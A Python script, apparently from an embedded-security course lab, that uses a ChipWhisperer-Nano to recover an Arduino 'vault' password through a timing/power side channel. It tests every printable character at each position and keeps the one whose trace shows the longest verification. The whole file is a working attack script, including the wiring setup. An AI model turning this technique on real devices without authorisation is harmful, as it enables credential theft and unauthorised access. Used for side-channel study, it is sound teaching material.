"""
Timing side-channel attack on the Embedded-Security Arduino "vault".

Target behaviour (from the course wiki):
  * The password uses ASCII chars in the decimal range 33 ('!') .. 126 ('~').
  * Arduino pin 13 is held HIGH for the whole duration of the verification and
    LOW otherwise  ->  we use it as the ChipWhisperer-Nano trigger (GPIO4).
  * The verification compares the guess character-by-character and exits early
    on the first wrong character. So the MORE leading characters are correct,
    the LONGER verification runs -> the longer pin 13 stays high -> the more
    "active" the captured power trace is.

Attack:
  For each position, try every candidate character appended to the prefix we
  already recovered. The candidate that makes verification run the LONGEST
  (largest power feature) is the correct next character. Append it, repeat.

Wiring (Nano 20-pin header):
  pin 2  -> Arduino GND
  pin 8  -> Arduino 5V (VREF)
  pin 10 -> Arduino RX
  pin 12 -> Arduino TX
  GPIO4 (trigger) -> Arduino pin 13
  100 ohm shunt on ATmega VCC (pin 7), behind the RC pi filter, as the probe.

Run:  python attack_password.py
"""

import time
import numpy as np
import chipwhisperer as cw

# ---------------------------------------------------------------------------
# Configuration -- tweak these to your setup
# ---------------------------------------------------------------------------
BAUD          = 9600
SAMPLES       = 5000      # raise if the trace clips before verification ends
N_REPEAT      = 5         # captures averaged per candidate (noise reduction)
PAD_LEN       = 16        # total chars sent per attempt (keeps message length fixed)
FILL          = "\x00"    # filler after the tested char (forces a mismatch -> early exit)
CHARSET       = [chr(c) for c in range(33, 127)]   # '!'..'~'
KNOWN_PREFIX  = ""        # set to "f" to skip the known first char; "" discovers it
MAX_LEN       = 16        # safety cap on password length
Z_STOP        = 4.0       # stop when the best candidate no longer clearly stands out
SETTLE        = 0.02      # seconds to let the target settle between attempts


def make_scope():
    scope = cw.scope()
    scope.default_setup()
    scope.adc.samples = SAMPLES
    target = cw.target(scope, cw.targets.SimpleSerial2)
    target.baud = BAUD
    return scope, target


def feature_of_trace(trace):
    """Total dynamic power = how 'busy'/long the verification was.

    A longer-matching guess keeps the ATmega working longer inside the capture
    window, so the summed absolute deviation from the mean is larger.
    """
    t = np.asarray(trace, dtype=np.float64)
    return float(np.sum(np.abs(t - t.mean())))


def capture_guess(scope, target, guess):
    """Send one attempt, return (feature, trace) or (None, None) on trigger timeout."""
    # flush stale bytes from the target
    try:
        pending = target.ser.in_waiting() or 0
        if pending:
            target.ser.read(pending)
    except Exception:
        pass

    msg = guess.ljust(PAD_LEN, FILL)[:PAD_LEN] + "\n"
    scope.arm()
    target.ser.write(msg.encode("latin-1"))
    timed_out = scope.capture()          # blocks until GPIO4 (pin 13) rises, or timeout
    if timed_out:
        return None, None
    trace = scope.get_last_trace()
    time.sleep(SETTLE)
    return feature_of_trace(trace), trace


def score_candidate(scope, target, guess):
    """Average the feature over N_REPEAT captures; skip timeouts."""
    vals = []
    for _ in range(N_REPEAT):
        f, _ = capture_guess(scope, target, guess)
        if f is not None:
            vals.append(f)
    if not vals:
        return None
    return float(np.mean(vals))


def recover_password():
    scope, target = make_scope()
    print(scope)
    recovered = KNOWN_PREFIX

    try:
        for pos in range(len(recovered), MAX_LEN):
            scores = {}
            for ch in CHARSET:
                s = score_candidate(scope, target, recovered + ch)
                if s is not None:
                    scores[ch] = s

            if not scores:
                print(f"[pos {pos}] no trigger on any candidate -- check wiring/protocol.")
                break

            ranked = sorted(scores.items(), key=lambda kv: kv[1], reverse=True)
            best_ch, best_val = ranked[0]

            vals = np.array(list(scores.values()))
            median = float(np.median(vals))
            std = float(np.std(vals)) or 1e-9
            margin = (best_val - median) / std   # how far the winner stands out

            top5 = "  ".join(f"{repr(c)}:{v:.0f}" for c, v in ranked[:5])
            print(f"[pos {pos}] best={best_ch!r} (margin {margin:.1f} sigma)   top5: {top5}")

            if margin < Z_STOP:
                print(f"[pos {pos}] no clear winner -> assuming end of password.")
                break

            recovered += best_ch
            print(f"         recovered so far: {recovered!r}")

        print("\n==============================")
        print("Recovered password:", repr(recovered))
        print("==============================")
    finally:
        scope.dis()

    return recovered


if __name__ == "__main__":
    recover_password()
